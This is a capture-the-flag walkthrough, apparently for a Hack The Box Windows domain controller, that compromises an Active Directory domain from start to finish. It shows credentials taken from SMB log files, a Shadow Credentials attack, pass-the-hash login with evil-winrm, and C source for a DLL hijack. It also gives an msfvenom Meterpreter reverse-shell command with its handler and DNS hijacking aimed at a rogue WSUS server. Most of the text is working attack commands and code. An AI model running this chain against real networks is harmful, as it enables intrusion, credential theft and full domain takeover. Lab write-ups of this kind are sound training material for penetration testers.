Given account: wallace.everette / Welcome2026@


at first find active prots
```bash
ports=$(nmap -p- --min-rate=1000 -T4 10.129.245.130 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
```
detail scan
```bash
nmap -p$ports -sC -sV 10.129.245.130
```

```bash
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-26 10:46:37Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: logging.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.logging.htb, DNS:logging.htb, DNS:logging
| Not valid before: 2026-04-24T16:40:59
|_Not valid after:  2106-04-24T16:40:59
|_ssl-date: 2026-07-26T10:48:06+00:00; +6h59m59s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: logging.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-07-26T10:48:06+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.logging.htb, DNS:logging.htb, DNS:logging
| Not valid before: 2026-04-24T16:40:59
|_Not valid after:  2106-04-24T16:40:59
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: logging.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-07-26T10:48:06+00:00; +6h59m59s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.logging.htb, DNS:logging.htb, DNS:logging
| Not valid before: 2026-04-24T16:40:59
|_Not valid after:  2106-04-24T16:40:59
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: logging.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-07-26T10:48:06+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.logging.htb, DNS:logging.htb, DNS:logging
| Not valid before: 2026-04-24T16:40:59
|_Not valid after:  2106-04-24T16:40:59
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8530/tcp  open  http          Microsoft IIS httpd 10.0
|_http-title: Site doesn't have a title.
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
8531/tcp  open  ssl/unknown
| tls-alpn: 
|   h2
|_  http/1.1
| ssl-cert: Subject: 
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.logging.htb
| Not valid before: 2026-04-24T15:49:07
|_Not valid after:  2027-04-24T15:49:07
|_ssl-date: 2026-07-26T10:48:06+00:00; +7h00m00s from scanner time.
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49694/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49695/tcp open  msrpc         Microsoft Windows RPC
49700/tcp open  msrpc         Microsoft Windows RPC
49715/tcp open  msrpc         Microsoft Windows RPC
49753/tcp open  msrpc         Microsoft Windows RPC
49791/tcp open  msrpc         Microsoft Windows RPC
49797/tcp open  msrpc         Microsoft Windows RPC
49833/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m58s
| smb2-time: 
|   date: 2026-07-26T10:47:57
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 101.60 seconds
```
domain: logging.htb
hostname DC01
WinRM isexposed on 5985 , which will matter once we hold valid credentials. The two ports worth flagging early are
8530 and 8531 , these are the default HTTP and HTTPS ports for a WSUS server, and they hint that
Windows Update is being served internally.
Now add the domain to /etc/hosts
```bash
echo "10.129.245.130 logging.htb DC01.logging.htb" | sudo tee -a /etc/hosts
```
## Enumerating

port 80 returns nothing
<img width="1110" height="727" alt="image" src="https://github.com/user-attachments/assets/a077d77a-f7ce-4244-84a8-5b431cc46e83" />

### SMB
```bash
smbclient -U wallace.everette -L logging.htb
Password for [WORKGROUP\wallace.everette]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Logs            Disk      
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
        WSUSTemp        Disk      A network share used by Local Publishing from a Remote WSUS Console Instance.
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to logging.htb failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
now enumerate the share

```bash
smbclient -U wallace.everette \\\\logging.htb\\Logs
Password for [WORKGROUP\wallace.everette]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Apr 17 05:10:09 2026
  ..                                  D        0  Fri Apr 17 05:10:09 2026
  Audit_Heartbeat.log                 A     1294  Fri Apr 17 05:10:09 2026
  IdentitySync_Trace_20260219.log      A     8488  Fri Apr 17 05:10:09 2026
  Service_State.log                   A      468  Fri Apr 17 05:10:09 2026
  TaskMonitor.log                     A     1170  Fri Apr 17 05:10:09 2026

                6657279 blocks of size 4096. 1702286 blocks available
smb: \> get Audit_Heartbeat.log
getting file \Audit_Heartbeat.log of size 1294 as Audit_Heartbeat.log (1.4 KiloBytes/sec) (average 1.4 KiloBytes/sec)
smb: \> get IdentitySync_Trace_20260219.log
getting file \IdentitySync_Trace_20260219.log of size 8488 as IdentitySync_Trace_20260219.log (9.0 KiloBytes/sec) (average 5.2 KiloBytes/sec)
smb: \> get Service_State.log
getting file \Service_State.log of size 468 as Service_State.log (0.5 KiloBytes/sec) (average 3.6 KiloBytes/sec)
smb: \> get TaskMonitor.log
getting file \TaskMonitor.log of size 1170 as TaskMonitor.log (0.9 KiloBytes/sec) (average 2.8 KiloBytes/sec)
smb: \> 
```
after viewing the log file we get a new set of credential
<img width="1475" height="270" alt="image" src="https://github.com/user-attachments/assets/be427e63-41d7-4bac-a08c-bb2abc6228fc" />
LOGGING\svc_recovery : Em3rg3ncyPa$$2025

```bash
netexec smb logging.htb -u svc_recovery -p 'Em3rg3ncyPa$$2025'
```
<img width="1246" height="558" alt="image" src="https://github.com/user-attachments/assets/12ae183e-8421-4184-a6a9-2e95f8bcecec" />
This status is
returned when the credentials themselves are not the problem, but a policy prevents the logon method
from being used, and the classic cause on a domain controller is membership in the Protected Users
group. Members of that group are barred from NTLM authentication and can only authenticate over
Kerberos, which is exactly why the NTLM-based check is being refused before the password is ever
validated. We can confirm the membership directly with our wallace account.
```bash
nxc ldap logging.htb -u wallace.everette -p 'Welcome2026@' --groups "Protected Users"
```
<img width="1129" height="145" alt="image" src="https://github.com/user-attachments/assets/f1ce65f8-b3c7-48e8-81fa-a16ba0ffe8b8" />
With NTLM off the table, the workaround is to request a Kerberos TGT with Impacket's getTGT.py . Using
the exact password from the log still fails, since the account has clearly rotated its password since that trace
was written. Also, we make sure to sync our machine time with the remote machine
```bash
ntpdate -s logging.htb
impacket-getTGT logging.htb/svc_recovery:'Em3rg3ncyPa$$2025' 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Kerberos SessionError: KDC_ERR_PREAUTH_FAILED(Pre-authentication information was invalid)
```
The password's structure is the useful clue here. It follows a predictable Em3rg3ncyPa$$<year> pattern, so
the most likely current value simply advances the year to the present one. Incrementing 2025 to 2026
produces a valid ticket.

<img width="824" height="189" alt="image" src="https://github.com/user-attachments/assets/ba14ad9a-4cbb-4fe4-9a5a-1fef4bed9cf2" />
Now that we can authenticate as svc_recovery , we collect a fresh set of BloodHound data using the ticket
```bash
 bloodhound-python -k -u svc_recovery -p 'Em3rg3ncyPa$$2026' -d LOGGING.HTB -ns 10.129.245.130 -dc DC01.LOGGING.HTB -c All
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: logging.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: DC01.LOGGING.HTB
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: DC01.LOGGING.HTB
INFO: Found 14 users
INFO: Found 57 groups
INFO: Found 3 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.logging.htb
INFO: Done in 00M 54S
```
<img width="3215" height="1184" alt="image" src="https://github.com/user-attachments/assets/6cace4ba-c87b-4569-915d-ec91513e5c4d" />
The password's structure is the useful clue here. It follows a predictable Em3rg3ncyPa$$<year> pattern, so
the most likely current value simply advances the year to the present one. Incrementing 2025 to 2026
produces a valid ticket.
Now that we can authenticate as svc_recovery , we collect a fresh set of BloodHound data using the ticket.
Importing the data into BloodHound , we can now see an outbound edge showing that svc_recovery holds
GenericWrite over a Managed Service Account named msa_health .

We can also corroborate this without touching the GUI by asking BloodyAD which objects the service
account is able to write to.
```bash
bloodyAD --host dc01.logging.htb -d logging.htb -u svc_recovery -k get writable
```
this wasnot working for me so
```bash
export KRB5CCNAME=$(pwd)/svc_recovery.ccache
klist          # confirm the ticket is loaded and not expired
bloodyAD --host dc01.logging.htb -d logging.htb -u svc_recovery -k ccache=$KRB5CCNAME get writable
```
<img width="844" height="448" alt="image" src="https://github.com/user-attachments/assets/5d7d5315-12dd-41d1-bf3d-bf2511db68fb" />
## Foothold
Write access over an account's attributes is enough to perform a Shadow Credentials attack. We can abuse
the msDS-KeyCredentialLink attribute to add our own certificate as an alternate credential, then
authenticate over Kerberos PKINIT to recover the account's NTLM hash. BloodyAD makes generating the
key credential straightforward

```bash
bloodyAD --host dc01.logging.htb -d logging.htb -u svc_recovery -k add shadowCredentials 'msa_health$'
```

A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
Run the following command to obtain a TGT:
```
python3 PKINITtools/gettgtpkinit.py -cert-pem dCEr5S9M_cert.pem -key-pem dCEr5S9M_priv.pem
logging.htb/msa_health$ dCEr5S9M.ccache
With the certificate and private key in hand, we request a TGT for the MSA over PKINIT using PKINITtools .
git clone https://github.com/dirkjanm/PKINITtools.git
$ python3 PKINITtools/gettgtpkinit.py -cert-pem dCEr5S9M_cert.pem -key-pem
dCEr5S9M_priv.pem logging.htb/msa_health$ dCEr5S9M.ccache
2026-07-17 00:22:18,519 minikerberos INFO Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2026-07-17 00:22:18,529 minikerberos INFO Requesting TGT INFO:minikerberos:Requesting
TGT
2026-07-17 00:22:19,182 minikerberos INFO AS-REP encryption key (you might need this
later): INFO:minikerberos:AS-REP encryption key (you might need this later):
2026-07-17 00:22:19,182 minikerberos INFO
6d55c85f1ac0a740e35299fce1e09697b8cc22f32ab12b0dc1f07c8d25dc822f
INFO:minikerberos:6d55c85f1ac0a740e35299fce1e09697b8cc22f32ab12b0dc1f07c8d25dc822f
2026-07-17 00:22:19,185 minikerberos INFO Saved TGT to file INFO:minikerberos:Saved
TGT to file
```
The AS-REP encryption key obtained can now be used to request a service ticket to ourselves with
getnthash.py . We then extract the account's NTLM hash from the returned PAC.
BloodHound shows the msa_health account is a member of the Remote Management Users group, so we
can pass the recovered hash to evil-winrm and land a shell.
Lateral Movement
Inside the MSA's Documents folder, we find a PowerShell script monitor.ps1 .
Reading the script, we learn that it monitors the health of a scheduled task called UpdateChecker Agent
and appends its status to a log file. The comments explain that it deliberately talks to the Task Scheduler
through the Schedule.Service COM interface to sidestep CIM and WMI permission restrictions. This is a
strong hint about how we should enumerate the task ourselves.
```
$ export KRB5CCNAME=dCEr5S9M.ccache
$ python3 PKINITtools/getnthash.py logging.htb/msa_health$ -key
6d55c85f1ac0a740e35299fce1e09697b8cc22f32ab12b0dc1f07c8d25dc822f
[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
603fc24ee01a9409f83c9d1d701485c5
```
**but newer bloodyAD does this autometically so**
<img width="1093" height="104" alt="image" src="https://github.com/user-attachments/assets/a39bc31d-5d2d-40c7-97c4-af3038598999" />


BloodHound shows the msa_health account is a member of the Remote Management Users group, so we
can pass the recovered hash to evil-winrm and land a shell
<img width="1482" height="563" alt="image" src="https://github.com/user-attachments/assets/a05bc237-3c2d-449b-bf94-62471cdfd6c5" />
```bash
evil-winrm -i logging.htb -u msa_health$ -H 603fc24ee01a9409f83c9d1d701485c5
```
<img width="1082" height="237" alt="image" src="https://github.com/user-attachments/assets/0edace21-65c6-45bf-b019-afdf6b1b7798" />

## Lateral Movement

<img width="1057" height="491" alt="image" src="https://github.com/user-attachments/assets/3e0adfc9-f1a9-453b-a2f3-7f066d46157a" />

monitor.ps1 contains
```powershell
<#
.SYNOPSIS
    Monitors the status of the "UpdateChecker Agent" scheduled task.
    Uses COM interface to avoid CIM/WMI permission issues.
#>

$TaskName = "UpdateChecker Agent"
$LogPath = "C:\Share\Logs\TaskMonitor.log"
$Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"

try {
    $service = New-Object -ComObject "Schedule.Service"
    $service.Connect()
    $task = $service.GetFolder("\").GetTask($TaskName)

    $State = switch ($task.State) {
        1 { "Disabled" }
        2 { "Queued" }
        3 { "Ready" }
        4 { "Running" }
        5 { "Disabled" }
        6 { "Unknown" }
        default { "Unknown" }
    }

    if ($State -ne "Ready" -and $State -ne "Running") {
        $Message = "[$Timestamp] WARN  - Task [$TaskName] is in an unexpected state: $State"
    }
    else {
        $Message = "[$Timestamp] INFO  - Task [$TaskName] health check: OK (State: $State)"
    }
}
catch {
    $Message = "[$Timestamp] ERROR - Failed to query task [$TaskName]. Exception: $($_.Exception.Message)"
}

Add-Content -Path $LogPath -Value $Message
```

Reading the script, we learn that it monitors the health of a scheduled task called UpdateChecker Agent
and appends its status to a log file. The comments explain that it deliberately talks to the Task Scheduler
through the Schedule.Service COM interface to sidestep CIM and WMI permission restrictions. This is a
strong hint about how we should enumerate the task ourselves.

The TaskMonitor.log it writes to is the same one we already pulled from the initial share, but now that we
have interactive access, we can inspect the task directly. Both schtasks and Get-ScheduledTask fail with
access-denied errors, because our account has no rights to the scheduler over the standard RPC and CIM
channels.
<img width="973" height="280" alt="image" src="https://github.com/user-attachments/assets/0d0b9d55-6c54-41b6-9276-569fa715a62e" />
Following the same method the script uses, we query the task through the COM object, which is permitted
for our account.

<img width="1028" height="891" alt="image" src="https://github.com/user-attachments/assets/a9bc6710-19d4-41f8-8f99-26dc104946f4" />

The XML tells us several useful things at once. The PT3M interval means the task fires every three minutes.
Although the task was registered by the Administrator , the Principal runs it under a specific SID, S-1-
5-21-4020823815-2796529489-1682170552-2105 , which resolves to the jaylee.clifton user. Whatever
the task executes will therefore run in that user's context. The action itself launches C:\Program
Files\UpdateMonitor\UpdateMonitor.exe .
<img width="698" height="276" alt="image" src="https://github.com/user-attachments/assets/d3a1f3af-a2f4-4641-bb9f-ef2b7c12d01f" />

Checking the permissions on the C:\Program Files\UpdateMonitor\UpdateMonitor.exe binary shows the
IT group has full control over it.
<img width="1018" height="180" alt="image" src="https://github.com/user-attachments/assets/47235a87-adba-498c-a704-4fb7d65b1d65" />

BloodHound confirms that jaylee.clifton is a member of the IT group, which is worth keeping in mind
for the privilege-escalation stage.
<img width="1185" height="471" alt="image" src="https://github.com/user-attachments/assets/b81a5477-2ea1-469b-8b1c-fbe2649dcaa7" />

Further enumeration shows us a folder C:\Programdata\UpdateMonitor , and its permissions carry the
default BUILTIN\Users write entries, which means any user, including our current one, can create files
there.
<img width="751" height="138" alt="image" src="https://github.com/user-attachments/assets/ca3db425-42c5-40b5-af13-0583effc9ac0" />

A Logs subfolder in the directory holds monitor.log , which records what the binary does on each run.
Reading it one line at a time paints a clear picture of the update workflow
<img width="921" height="672" alt="image" src="https://github.com/user-attachments/assets/228c84c5-99ef-432a-98c5-ec069988f58e" />
The binary first checks a remote core server for a Settings_Update.zip , then falls back to looking for the
same archive locally in C:\ProgramData\UpdateMonitor , and finally attempts to load
settings_update.dll from the Program Files directory. That load fails with error 126 , which is
ERROR_MOD_NOT_FOUND , meaning the required DLL simply does not exist. This is a textbook DLL search-
order hijack because we can write into the ProgramData folder and we can drop our own
Settings_Update.zip containing a malicious Settings_Update.dll , which the task will then unzip and
load in the context of jaylee.clifton .
We start with a minimal DLL that spawns a command from DllMain so we can confirm execution
```c
# dllhijack.c
#include<windows.h>
#include<stdlib.h>
#include<stdio.h>
void Entry(){
system("cmd /c whoami > c:\\windows\\tasks\\test.txt");
}
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0,(LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DETACH:
break;
}
return TRUE;
}
```
<img width="575" height="204" alt="image" src="https://github.com/user-attachments/assets/0fbd3476-e835-46cf-8cd3-840439f0cdd0" />

After waiting for the next three-minute cycle, the log confirms that the archive was detected and unzipped,
but it did not run our code.
<img width="858" height="163" alt="image" src="https://github.com/user-attachments/assets/52eb37ac-f965-42cc-b360-2c1d31435f6e" />
The message reveals that the binary does not simply load the DLL ; it expects to call an exported function
named PreUpdateCheck . We adjust our DLL to export that function and, this time, point it at a
Meterpreter reverse shell staged in the same directory. We generate the reverse shell payload with
msfvenom .
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.28 LPORT=4444 -f exe -o
rev.exe
```
Then, set up the corresponding exploit handler on port 4444 .
```bash
msfconsole
msf > use exploit/multi/handler
msf exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
msf exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf exploit(multi/handler) > set LHOST 10.10.15.146
LHOST => 10.10.15.146
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.15.146:4444 
```

Our updated DLL exports PreUpdateCheck , which launches the reverse shell.
```c
#include<windows.h>
#include<stdlib.h>
#include<stdio.h>
void Entry(){

system("cmd /c c:\\programdata\\updatemonitor\\rev.exe");
}
__declspec(dllexport) void PreUpdateCheck() {
Entry();
}
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0,(LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DETACH:
break;
}
return TRUE;
}
```
We recompile, repackage, and re-upload as before this time update the rev.exe as well. On the next cycle, the log shows the export being called.
Our handler receives the session, and we have pivoted to jaylee.clifton .
The user flag can be found in C:\Users\jaylee.clifton\Desktop\user.txt
<img width="597" height="247" alt="image" src="https://github.com/user-attachments/assets/60bf5404-b670-4720-be01-0a4c0121d0dd" />

## Privilege Escalation
Enumerating jaylee.clifton 's home directory, we find a Tickets folder containing an incident report
about WSUS remediation.
We can download this HTML file and view it in the browser.
<img width="1034" height="379" alt="image" src="https://github.com/user-attachments/assets/c8cc86e4-9407-4dcb-a17c-0f06a652cc0a" />
<img width="784" height="610" alt="image" src="https://github.com/user-attachments/assets/3d897c9c-ef38-4218-a783-7c68034a4662" />
t is a report that references a ForceSync task that runs a Windows Update check every couple of minutes.
It points to a wsus.logging.htb host, and notes that the corresponding DNS record has not been created
yet. We can confirm this by running an nslookup query for wsus.logging.htb .
<img width="640" height="196" alt="image" src="https://github.com/user-attachments/assets/bab56c83-9343-4806-94e8-229438ee4188" />
Because the ticket ties the box to Windows Update, we inspect the Windows Update policy registry key to
learn where the machine is configured to fetch updates from.

```bash
meterpreter > reg enumkey -k HKLM\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate
Values (5):
AcceptTrustedPublisherCerts
WUServer
WUStatusServer
UpdateServiceUrlAlternate
SetProxyBehaviorForUpdateDetection
meterpreter > reg queryval -k HKLM\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate
-v WUServer
Key: HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate
Name: WUServer
Type: REG_SZ
Data: https://wsus.logging.htb:8531
```
The WUServer value confirms the host is pointed at https://wsus.logging.htb:8531 , which has no DNS
record. Since our wallace account holds the ability to create DNS records in the zone, we add one that
points wsus.logging.htb at our attacking machine, effectively hijacking where the DC looks for updates
```bash
python3 ./krbrelayx/dnstool.py -u 'logging.htb\wallace.everette' -p 'Welcome2026@' 10.129.245.130 -a add -r wsus.logging.htb -d 10.10.16.227
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```
After the record propagates, the name now resolves to our IP address.
<img width="422" height="159" alt="image" src="https://github.com/user-attachments/assets/2c911010-f6e4-44a5-8339-618fb05b81c5" />
Listening on the WSUS HTTPS port referenced in the registry confirms that the ForceSync task is driving
the DC to contact us, but the traffic is encrypted under TLS, so a plain listener gets us nowhere useful, as
seen below.
<img width="645" height="263" alt="image" src="https://github.com/user-attachments/assets/8be4fdb6-4ab6-46ff-a551-8f477876fd48" />


Serving WSUS over HTTPS means we cannot simply spoof the update endpoint. We need a certificate that
the DC will trust for wsus.logging.htb . Researching WSUS abuse over TLS leads to this blog post, which
describes exactly this situation and points to the ESC17 certificate-template attack together with a dedicated
Certipy PR branch. The idea is to enroll a certificate whose subject we control from a template that permits
server authentication, and then present it as our rogue WSUS server's TLS certificate.
We install the wsuks tool and the ESC17-capable build of Certipy .

```bash
$ sudo apt install pipx python3-nftables
$ pipx ensurepath
$ pipx install wsuks --system-site-packages
$ sudo ln -s ~/.local/bin/wsuks /usr/local/sbin/wsuks
$ pipx install git+https://github.com/NeffIsBack/Certipy.git@ESC17 --suffix=-esc17
```
The enrollment needs to run as jaylee.clifton , since that user is in the IT group that holds enrollment
rights. From our Meterpreter session on the target, we upload and use Rubeus to obtain a usable ticket
for the user.






